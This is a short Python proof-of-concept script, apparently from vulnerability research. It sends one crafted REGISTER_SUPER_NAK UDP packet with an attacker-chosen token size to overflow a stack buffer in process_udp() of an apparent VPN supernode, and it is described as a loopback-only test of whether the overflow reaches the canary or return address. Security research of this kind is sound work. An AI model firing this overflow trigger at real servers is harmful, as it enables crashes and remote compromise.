#!/usr/bin/env python3
"""Send one REGISTER_SUPER_NAK with a caller-chosen token_size (no peer setup).

Used to measure whether the stack overflow can reach the canary or the saved
return address of process_udp() in the plain build. Loopback only.
"""
import socket
import struct
import sys

port = int(sys.argv[1])
token_size = int(sys.argv[2])

community = b"mynetwork".ljust(20, b"\0")
pkt = (bytes([3, 3]) + struct.pack("!H", 8) + community
       + struct.pack("!I", 0x11223344)
       + bytes([2, 0, 0, 0, 0, 1])
       + struct.pack("!HH", 0, token_size)
       + bytes([0x48, 0x5a, 0x4d, 0x49]) * (token_size // 4))
assert len(pkt) == 38 + token_size

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(pkt, ("127.0.0.1", port))
sock.close()
print(f"sent token_size={token_size} datagram len={len(pkt)}")
